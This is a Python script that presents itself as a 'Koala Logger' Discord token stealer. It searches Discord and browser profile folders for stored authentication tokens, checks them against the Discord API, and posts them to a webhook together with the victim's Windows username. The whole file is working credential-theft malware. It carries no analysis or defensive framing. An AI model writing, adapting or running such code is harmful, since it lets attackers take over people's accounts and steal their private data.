import requests
import os
import glob
import re
import getpass
import os

WEBHOOK = ""
appdatapath = os.getenv('APPDATA')
paths = [
   appdatapath + '\\Discord',
   appdatapath + '\\discordcanary',
   appdatapath + '\\discordptb',
   appdatapath + '\\Google\\Chrome\\User Data\\Default',
   appdatapath + '\\Opera Software\\Opera Stable',
   appdatapath + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
   appdatapath + '\\Yandex\\YandexBrowser\\User Data\\Default']
tknpaths = []
def getTokens(path):
	tokns = []
	files = glob.glob(path + r"\Local Storage\leveldb\*.ldb")
	files.extend(glob.glob(path + r"\Local Storage\leveldb\*.log"))
	for file in files:
		with open( file, 'r',encoding='ISO-8859-1') as content_file:
			try:
				content = content_file.read()
				possible = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', content)]
				tokenpath = ['\n\n' + path + ' :\n']
				if len(possible) > 0:
					tknpaths.append(tokenpath)
					tokns.extend(possible)
					#print(possible)
			except:
				pass
	return tokns

tksn = []
def SendTokens(tkns):
	content = f"**__[+ KOALA LOGGER +]__** Logged {len(tkns)} tokens from {getpass.getuser()}\n"
	for tkn in tkns:
		content += tkn + "\n"
	payload = {
	"content" : content,
	"username" : "Token Logger By Infamous Koala"
	}
	requests.post(WEBHOOK, data=payload)
for _dir in paths:
	tksn.extend(getTokens(_dir))
if len(tksn) < 1:
	requests.post(WEBHOOK, data="Nothing found")
for check in tksn:
	check = str(check)
	if check.startswith('\n'):
		continue
	else:
		sake = requests.get('https://canary.discordapp.com/api/v9/users/@me', headers = {'Authorization': check}) #update this api url in the future when they actually release v10 for normal members
	if sake.status_code == 200:
	    tksn.append("token pulled:" + check)
SendTokens(tksn)
